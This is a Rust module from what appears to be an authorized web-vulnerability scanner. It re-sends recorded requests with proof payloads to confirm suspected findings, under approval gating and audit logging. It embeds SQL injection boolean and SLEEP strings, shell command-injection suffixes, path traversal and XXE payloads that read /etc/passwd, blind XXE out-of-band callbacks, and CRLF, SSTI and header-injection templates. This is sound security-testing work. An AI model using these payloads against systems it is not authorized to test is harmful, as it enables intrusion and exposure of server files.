//! Automatic proving: pick an oracle by vulnerability class, rebuild the
//! request from a suspected finding's first evidence exchange, and run it
//! through `proof_run` (which gates the send, stores the proof and links it to
//! the finding on success). This is what turns the sweep's "suspected"
//! findings into "proven" ones; IDOR/BFLA are proven by the authorization
//! matrix instead (differential oracle) and reused here when a finding has the
//! identities for it.

use pm_policy::Actor;
use pm_scan::active::{Point, PointKind, inject, inject_operator, points};
use serde::Serialize;

use crate::{ProofRequest, ProofResult, Result, Service};

/// The result of trying to prove one finding.
#[derive(Debug, Clone, Serialize)]
pub struct FindingProve {
    pub finding_id: i64,
    pub vuln_class: String,
    pub proven: bool,
    /// Why, or why not (the winning oracle's reasons, else the last attempt's).
    pub reasons: Vec<String>,
    /// The oracle that proved it, when proven.
    pub oracle: Option<String>,
    pub proof_id: Option<i64>,
}

/// A run of [`Service::auto_prove`].
#[derive(Debug, Clone, Serialize, Default)]
pub struct ProveSweep {
    pub attempted: usize,
    pub proven: usize,
    pub results: Vec<FindingProve>,
}

/// An alnum sentinel that survives percent-encoding, so a placeholder can be
/// dropped into an injected request without the encoder mangling its braces.
const SENTINEL: &str = "pmproofzz";

/// Classes `auto_prove` tries. IDOR/BFLA/authn come from the matrix; a few
/// classes (mass assignment, cache poisoning, …) have no automatic oracle yet
/// and stay suspected.
pub(crate) const AUTO_PROVE_CLASSES: &[&str] = &[
    "xss",
    "dom_xss",
    "stored_xss",
    "sqli",
    "command_injection",
    "rce",
    "path_traversal",
    "open_redirect",
    "crlf",
    "ssrf",
    "ssti",
    "nosqli",
    "xxe",
    "cors",
    "host_header_injection",
];

/// Classes proven on the request as a whole (a header, the XML document),
/// not at one insertion point.
const WHOLE_REQUEST_CLASSES: &[&str] = &["xxe", "cors", "host_header_injection"];

impl Service {
    /// Proves every suspected, unproven finding whose class has an oracle.
    /// Bounded so an automatic pass can't run unboundedly many sends.
    pub async fn auto_prove(&self, actor: &Actor) -> Result<ProveSweep> {
        let mut sweep = ProveSweep::default();
        let findings = self.finding_list(Some("suspected"))?;
        for f in findings.into_iter().take(80) {
            let class = f["vuln_class"].as_str().unwrap_or_default();
            if !AUTO_PROVE_CLASSES.contains(&class) && !matches!(class, "idor" | "bfla") {
                continue;
            }
            let Some(id) = f["id"].as_i64() else { continue };
            let r = self.finding_prove(actor, id).await?;
            sweep.attempted += 1;
            if r.proven {
                sweep.proven += 1;
            }
            sweep.results.push(r);
        }
        self.audit(
            &actor.id(),
            "auto_prove",
            serde_json::json!({ "attempted": sweep.attempted, "proven": sweep.proven }),
            "ok",
        )?;
        Ok(sweep)
    }

    /// Tries to prove one finding. Picks oracles by class, rebuilds the request
    /// at the finding's insertion point (from its title, else candidate
    /// points), and runs each until one proves. Returns the outcome; the proof
    /// and the finding's `proven` status are stored by `proof_run`.
    pub async fn finding_prove(&self, actor: &Actor, id: i64) -> Result<FindingProve> {
        let f = self.finding_get(id)?;
        let class = f["vuln_class"].as_str().unwrap_or_default().to_string();
        let mut out = FindingProve {
            finding_id: id,
            vuln_class: class.clone(),
            proven: false,
            reasons: vec![],
            oracle: None,
            proof_id: None,
        };
        if f["status"].as_str() == Some("proven") {
            out.proven = true;
            out.reasons = vec!["already proven".into()];
            return Ok(out);
        }
        let evidence: Vec<i64> = serde_json::from_value(f["evidence"].clone()).unwrap_or_default();
        let Some(&baseline) = evidence.first() else {
            out.reasons = vec!["the finding has no evidence exchange to work from".into()];
            return Ok(out);
        };

        // IDOR/BFLA use the differential oracle with another identity.
        if matches!(class.as_str(), "idor" | "bfla") {
            return self.prove_differential_finding(actor, id, baseline, &class).await;
        }

        let Ok(ex) = self.exchange_raw(baseline) else {
            out.reasons = vec![format!("evidence exchange {baseline} is gone")];
            return Ok(out);
        };
        let mut raw = String::from_utf8_lossy(&ex.request).into_owned();
        let mut all_points = points(&raw);
        // The exact point from the finding's title "(… (query q))", else a few
        // likely candidates the class can use.
        let label = f["title"].as_str().and_then(parse_point_label);
        // A header the scanner added (e.g. User-Agent) is not in the recorded
        // request, so there is no point for it. Add it with a benign value and
        // use that request as the baseline too, so baseline and payload differ
        // only in the payload. `points()` only emits Header points for the
        // headers in its HEADERS list (user-agent, referer, x-forwarded-for),
        // so for any other header name nothing matches and we fall through.
        if let Some(name) = label.as_deref().and_then(|l| l.strip_prefix("header "))
            && label.as_deref().and_then(|l| find_point(&all_points, l)).is_none()
        {
            let value = if name == "user-agent" { "Mozilla/5.0 (X11; Linux x86_64)" } else { "1" };
            let with = with_header(&raw, name, value);
            let pts = points(&with);
            if label.as_deref().and_then(|l| find_point(&pts, l)).is_some() {
                raw = with;
                all_points = pts;
            }
        }
        let targeted: Vec<Point> = match label.as_deref().and_then(|l| find_point(&all_points, l)) {
            Some(p) => vec![p],
            None => candidate_points(&all_points),
        };

        let attempts: Vec<ProofRequest> = if WHOLE_REQUEST_CLASSES.contains(&class.as_str()) {
            whole_request_proofs(&class, baseline, &raw, &all_points)
        } else if class == "stored_xss" {
            // The scanner's evidence: the submission, then the page that showed the value.
            let view = evidence.get(1).and_then(|id| self.exchange_raw(*id).ok());
            let Some(view) = view else {
                out.reasons = vec!["the finding doesn't name the page that shows the stored value".into()];
                return Ok(out);
            };
            let view_raw = String::from_utf8_lossy(&view.request).into_owned();
            targeted
                .iter()
                .flat_map(|point| prove_requests("xss", baseline, &raw, point))
                .map(|r| ProofRequest { view_raw: Some(view_raw.clone()), ..r })
                .collect()
        } else {
            targeted.iter().flat_map(|point| prove_requests(&class, baseline, &raw, point)).collect()
        };
        let mut last = vec!["no oracle produced a proof".to_string()];
        for mut req in attempts {
            req.finding_id = Some(id);
            match self.proof_run(actor, req).await {
                Ok(ProofResult::Completed { proven, reasons, proof_id, oracle, .. }) => {
                    if proven {
                        out.proven = true;
                        out.reasons = reasons;
                        out.oracle = Some(oracle);
                        out.proof_id = Some(proof_id);
                        return Ok(out);
                    }
                    last = reasons;
                }
                Ok(ProofResult::Denied { reasons }) | Ok(ProofResult::PendingApproval { reasons, .. }) => {
                    out.reasons = reasons;
                    return Ok(out);
                }
                // A bad template for this point (e.g. no insertion possible): try the next.
                Err(_) => continue,
            }
        }
        out.reasons = last;
        Ok(out)
    }

    /// Differential-oracle proof for an IDOR/BFLA finding: re-send the recorded
    /// request as the owner and as another, non-admin identity.
    async fn prove_differential_finding(
        &self,
        actor: &Actor,
        id: i64,
        baseline: i64,
        class: &str,
    ) -> Result<FindingProve> {
        let mut out = FindingProve {
            finding_id: id,
            vuln_class: class.into(),
            proven: false,
            reasons: vec![],
            oracle: None,
            proof_id: None,
        };
        let ex = self.exchange_raw(baseline);
        let owner = ex.ok().and_then(|e| e.summary.identity);
        let idents = self.identity_list().unwrap_or_default();
        let attacker = idents
            .iter()
            .find(|i| Some(i.name.as_str()) != owner.as_deref() && !i.role.to_ascii_lowercase().contains("admin"));
        let Some(attacker) = attacker else {
            out.reasons = vec!["no second, non-admin identity to try as the attacker".into()];
            return Ok(out);
        };
        let req = ProofRequest {
            oracle: "differential_authz".into(),
            exchange_id: Some(baseline),
            attacker: Some(attacker.name.clone()),
            owner,
            finding_id: Some(id),
            ..Default::default()
        };
        match self.proof_run(actor, req).await {
            Ok(ProofResult::Completed { proven, reasons, proof_id, oracle, .. }) => {
                out.proven = proven;
                out.reasons = reasons;
                if proven {
                    out.oracle = Some(oracle);
                    out.proof_id = Some(proof_id);
                }
            }
            Ok(ProofResult::Denied { reasons }) | Ok(ProofResult::PendingApproval { reasons, .. }) => {
                out.reasons = reasons
            }
            Err(e) => out.reasons = vec![e.to_string()],
        }
        Ok(out)
    }
}

/// The ordered oracle attempts for a class at one insertion point.
fn prove_requests(class: &str, baseline: i64, raw: &str, point: &Point) -> Vec<ProofRequest> {
    let base = ProofRequest { exchange_id: Some(baseline), ..Default::default() };
    let mut out = Vec::new();
    let orig = &point.original;
    match class {
        "xss" | "reflected_input" | "dom_xss" => {
            let placeholder = match point.kind {
                PointKind::Query | PointKind::Form | PointKind::Cookie | PointKind::Nested | PointKind::Name => {
                    "{{xss_url}}"
                }
                _ => "{{xss}}",
            };
            if let Some(raw) = tmpl(raw, point, placeholder) {
                out.push(ProofRequest { oracle: "reflection".into(), raw: Some(raw), ..base.clone() });
            }
        }
        "sqli" => {
            // Error-based first (one quote vs a benign change), then a boolean
            // true/false split, then time-based.
            if let (Some(q1), Some(q2), Some(benign)) = (
                value_raw(raw, point, &format!("{orig}'")),
                value_raw(raw, point, &format!("{orig}' -- ")),
                value_raw(raw, point, &format!("{orig}pmz")),
            ) {
                out.push(ProofRequest {
                    oracle: "sql_error".into(),
                    raws: vec![raw.to_string(), q1, q2, benign],
                    ..base.clone()
                });
            }
            for (t, f) in BOOLEAN_PAIRS {
                if let (Some(tr), Some(fr)) =
                    (value_raw(raw, point, &format!("{orig}{t}")), value_raw(raw, point, &format!("{orig}{f}")))
                {
                    out.push(ProofRequest {
                        oracle: "boolean_injection".into(),
                        raws: vec![raw.to_string(), tr, fr],
                        ..base.clone()
                    });
                }
            }
            for s in SQL_SLEEPS {
                if let Some(pr) = value_raw(raw, point, &format!("{orig}{s}")) {
                    out.push(ProofRequest {
                        oracle: "timing".into(),
                        baseline_raw: Some(raw.to_string()),
                        payload_raw: Some(pr),
                        samples: Some(6),
                        min_effect_ms: Some(2000.0),
                        ..base.clone()
                    });
                }
            }
        }
        "command_injection" | "rce" => {
            for s in CMD_SLEEPS {
                if let Some(pr) = value_raw(raw, point, &format!("{orig}{s}")) {
                    out.push(ProofRequest {
                        oracle: "timing".into(),
                        baseline_raw: Some(raw.to_string()),
                        payload_raw: Some(pr),
                        samples: Some(6),
                        min_effect_ms: Some(2000.0),
                        ..base.clone()
                    });
                }
            }
        }
        "path_traversal" => {
            let control = value_raw(raw, point, &format!("../../../../../../../../etc/pmnope{}", SENTINEL));
            let file = value_raw(raw, point, "../../../../../../../../etc/passwd");
            if let (Some(control), Some(file)) = (control, file) {
                out.push(ProofRequest {
                    oracle: "path_traversal".into(),
                    raws: vec![raw.to_string(), control, file],
                    markers: vec!["root:".into()],
                    ..base.clone()
                });
            }
        }
        "open_redirect" => {
            if let Some(raw) = tmpl(raw, point, "http://{{marker}}.proxymind-oast.invalid/") {
                out.push(ProofRequest {
                    oracle: "marker".into(),
                    raw: Some(raw),
                    marker_kind: Some("redirect".into()),
                    ..base.clone()
                });
            }
        }
        "crlf" => {
            if let Some(raw) = tmpl(raw, point, "a%0d%0aX-Pm-{{marker}}:%201") {
                out.push(ProofRequest {
                    oracle: "marker".into(),
                    raw: Some(raw),
                    marker_kind: Some("crlf".into()),
                    ..base.clone()
                });
            }
        }
        "ssrf" => {
            if let Some(raw) = tmpl(raw, point, "{{oast}}") {
                out.push(ProofRequest { oracle: "oast".into(), raw: Some(raw), ..base.clone() });
            }
        }
        "ssti" => {
            // Each syntax: the bare numbers as a control, then two fresh
            // random products. Only an evaluator turns `A*B` into the product.
            for syntax in SSTI_SYNTAXES {
                let pairs = [rand_pair(), rand_pair()];
                let expr = |(a, b): (u64, u64)| syntax.replace('A', &a.to_string()).replace('B', &b.to_string());
                let control = value_raw(raw, point, &format!("{orig}{}*{}", pairs[0].0, pairs[0].1));
                let payloads: Option<Vec<String>> =
                    pairs.iter().map(|p| value_raw(raw, point, &format!("{orig}{}", expr(*p)))).collect();
                if let (Some(control), Some(payloads)) = (control, payloads) {
                    let mut raws = vec![raw.to_string(), control];
                    raws.extend(payloads);
                    out.push(ProofRequest {
                        oracle: "expression".into(),
                        raws,
                        markers: pairs.iter().map(|(a, b)| (a * b).to_string()).collect(),
                        ..base.clone()
                    });
                }
            }
        }
        "nosqli" => {
            // A true/false split through query operators: `$eq` of the
            // original value answers like the baseline, `$ne` of it doesn't —
            // but only where operators reach the database.
            let value = match (point.kind, orig.parse::<f64>()) {
                (PointKind::Json, Ok(n)) => serde_json::json!(n),
                _ => serde_json::json!(orig),
            };
            let pairs = [
                ("$eq", value.clone(), "$ne", value.clone()),
                ("$in", serde_json::json!([value.clone()]), "$nin", serde_json::json!([value])),
            ];
            for (t_op, t_val, f_op, f_val) in pairs {
                let as_text = |v: Option<Vec<u8>>| v.map(|v| String::from_utf8_lossy(&v).into_owned());
                if let (Some(t), Some(f)) = (
                    as_text(inject_operator(raw, point, t_op, &t_val)),
                    as_text(inject_operator(raw, point, f_op, &f_val)),
                ) {
                    out.push(ProofRequest {
                        oracle: "boolean_injection".into(),
                        raws: vec![raw.to_string(), t, f],
                        ..base.clone()
                    });
                }
            }
        }
        _ => {}
    }
    out
}

/// Proof attempts that change the request as a whole: a header for CORS and
/// Host-header injection, the XML document for XXE.
fn whole_request_proofs(class: &str, baseline: i64, raw: &str, all: &[Point]) -> Vec<ProofRequest> {
    let base = ProofRequest { exchange_id: Some(baseline), ..Default::default() };
    let marker = |kind: &str, raw: String| ProofRequest {
        oracle: "marker".into(),
        raw: Some(raw),
        marker_kind: Some(kind.into()),
        ..base.clone()
    };
    let mut out = Vec::new();
    match class {
        "cors" => {
            out.push(marker("cors", with_header(raw, "Origin", "https://{{marker}}.proxymind-oast.invalid")));
        }
        "host_header_injection" => {
            let host = "{{marker}}.proxymind-oast.invalid";
            out.push(marker("host", with_header(raw, "X-Forwarded-Host", host)));
            out.push(marker("host", with_header(raw, "X-Host", host)));
            // The request still goes to the target's address; only the name it claims changes.
            out.push(marker("host", with_header(raw, "Host", host)));
        }
        "xxe" => {
            // In-band: an entity that reads a known file, shown where an
            // element's text was; a bogus file name must read nothing.
            for point in all.iter().filter(|p| p.kind == PointKind::Xml).take(3) {
                let doc = |system: &str| xml_with_entity(raw, point, system);
                if let (Some(control), Some(passwd), Some(winini)) = (
                    doc(&format!("file:///etc/pmnope{SENTINEL}")),
                    doc("file:///etc/passwd"),
                    doc("file:///c:/windows/win.ini"),
                ) {
                    out.push(ProofRequest {
                        oracle: "path_traversal".into(),
                        raws: vec![raw.to_string(), control, passwd, winini],
                        markers: vec!["root:".into(), "[fonts]".into()],
                        ..base.clone()
                    });
                }
            }
            // Blind: a parameter entity fetched while the DOCTYPE is parsed
            // calls the out-of-band listener back.
            if let Some(blind) = xml_with_doctype(raw, "<!ENTITY % pmx SYSTEM \"{{oast}}\"> %pmx;") {
                out.push(ProofRequest { oracle: "oast".into(), raw: Some(blind), ..base.clone() });
            }
        }
        _ => {}
    }
    out
}

/// Template syntaxes for the expression oracle (`A` and `B` are replaced by
/// random numbers): Jinja2/Twig/Nunjucks, FreeMarker/Velocity/EL/JS template
/// literals, ERB/EJS, Ruby/Pug/JSF, Thymeleaf, Razor, Smarty.
const SSTI_SYNTAXES: &[&str] = &["{{A*B}}", "${A*B}", "<%= A*B %>", "#{A*B}", "*{A*B}", "@(A*B)", "{A*B}"];

/// Two random four-digit numbers (their product has 7 or 8 digits).
fn rand_pair() -> (u64, u64) {
    use ring::rand::{SecureRandom, SystemRandom};
    let mut b = [0u8; 4];
    let _ = SystemRandom::new().fill(&mut b);
    let n = |hi: u8, lo: u8| 1000 + (u64::from(hi) << 8 | u64::from(lo)) % 9000;
    (n(b[0], b[1]), n(b[2], b[3]))
}

/// `raw` with header `name` set to `value` (an existing one replaced).
fn with_header(raw: &str, name: &str, value: &str) -> String {
    let (head, body) = raw.split_once("\r\n\r\n").unwrap_or((raw, ""));
    let mut lines = head.split("\r\n");
    let request_line = lines.next().unwrap_or_default();
    let prefix = format!("{}:", name.to_ascii_lowercase());
    let rest: Vec<&str> = lines.filter(|l| !l.to_ascii_lowercase().starts_with(&prefix)).collect();
    let mut out = format!("{request_line}\r\n{name}: {value}\r\n");
    for l in rest {
        out.push_str(l);
        out.push_str("\r\n");
    }
    out.push_str("\r\n");
    out.push_str(body);
    out
}

/// The request with `decl` inside a DOCTYPE at the start of its XML body
/// (any XML declaration and DOCTYPE already there are dropped).
fn xml_with_doctype(raw: &str, decl: &str) -> Option<String> {
    let (head, body) = raw.split_once("\r\n\r\n")?;
    let mut doc = body.trim_start();
    if !doc.starts_with('<') {
        return None;
    }
    if doc.starts_with("<?xml") {
        doc = doc[doc.find("?>")? + 2..].trim_start();
    }
    if doc.starts_with("<!DOCTYPE") {
        // A DOCTYPE with an internal subset ends at "]>", else at ">".
        let end = match (doc.find('['), doc.find('>')) {
            (Some(b), Some(g)) if b < g => doc.find("]>")? + 2,
            (_, Some(g)) => g + 1,
            _ => return None,
        };
        doc = doc[end..].trim_start();
    }
    let root = doc.trim_start_matches('<').split(|c: char| c.is_whitespace() || c == '>' || c == '/').next()?;
    if root.is_empty() || root.starts_with(['!', '?']) {
        return None;
    }
    Some(format!("{head}\r\n\r\n<?xml version=\"1.0\"?>\n<!DOCTYPE {root} [{decl}]>\n{doc}"))
}

/// The request with an external entity `pmx` (pointing at `system`) declared
/// and used as the text of the XML element at `point`.
fn xml_with_entity(raw: &str, point: &Point, system: &str) -> Option<String> {
    let marked = String::from_utf8_lossy(&inject(raw, point, SENTINEL)?).into_owned();
    if !marked.contains(SENTINEL) {
        return None;
    }
    xml_with_doctype(&marked.replace(SENTINEL, "&pmx;"), &format!("<!ENTITY pmx SYSTEM \"{system}\">"))
}

/// (true, false) suffixes appended to the point's original value. Each closes
/// a different quoting/LIKE context so the condition reaches the WHERE clause.
const BOOLEAN_PAIRS: &[(&str, &str)] = &[
    ("%' AND '1'='1' -- ", "%' AND '1'='2' -- "),
    ("' AND '1'='1' -- ", "' AND '1'='2' -- "),
    (" AND 1=1 -- ", " AND 1=2 -- "),
    ("' AND '1'='1", "' AND '1'='2"),
];
/// Time-based payloads (suffixes); SLEEP(3) delays a vulnerable query ~3 s.
/// The concatenation form runs even when the WHERE clause matches no row.
const SQL_SLEEPS: &[&str] =
    &["%' AND SLEEP(3) -- ", "' AND SLEEP(3) -- ", " AND SLEEP(3) -- ", "';SELECT SLEEP(3) -- ", "'||SLEEP(3)||'"];
const CMD_SLEEPS: &[&str] = &["; sleep 3", "| sleep 3", "`sleep 3`", "$(sleep 3)", "& sleep 3"];

/// Injects a value at `point` and returns the request as a string (the value
/// is percent-encoded by `inject` where the context needs it).
fn value_raw(raw: &str, point: &Point, value: &str) -> Option<String> {
    inject(raw, point, value).map(|v| String::from_utf8_lossy(&v).into_owned())
}

/// Injects a sentinel at `point`, then replaces it with `placeholder` on the
/// whole request string, so braces in the placeholder survive encoding.
fn tmpl(raw: &str, point: &Point, placeholder: &str) -> Option<String> {
    let s = String::from_utf8_lossy(&inject(raw, point, SENTINEL)?).into_owned();
    s.contains(SENTINEL).then(|| s.replace(SENTINEL, placeholder))
}

/// The point named in parentheses at the end of a finding title, e.g.
/// "SQL injection in GET /x (query id)" → "query id". Spans nested parens too,
/// e.g. "(nested ctx.category (base64))" → "nested ctx.category (base64)".
fn parse_point_label(title: &str) -> Option<String> {
    // The last parenthesized group, matched from the end (earlier groups like
    // "(time-based blind)" belong to the title text).
    let close = title.rfind(')')?;
    let mut depth = 0usize;
    for (i, c) in title[..=close].char_indices().rev() {
        match c {
            ')' => depth += 1,
            '(' => {
                depth -= 1;
                if depth == 0 {
                    return Some(title[i + 1..close].to_ascii_lowercase());
                }
            }
            _ => {}
        }
    }
    None
}

/// The point whose "kind name" matches `label`.
fn find_point(all: &[Point], label: &str) -> Option<Point> {
    all.iter().find(|p| format!("{:?} {}", p.kind, p.name).to_ascii_lowercase() == label).cloned()
}

/// Likely insertion points to try when a finding names none: values of query,
/// form, JSON, path and nested parameters (not names or headers), capped.
fn candidate_points(all: &[Point]) -> Vec<Point> {
    all.iter()
        .filter(|p| {
            matches!(p.kind, PointKind::Query | PointKind::Form | PointKind::Json | PointKind::Path | PointKind::Nested)
        })
        .take(6)
        .cloned()
        .collect()
}
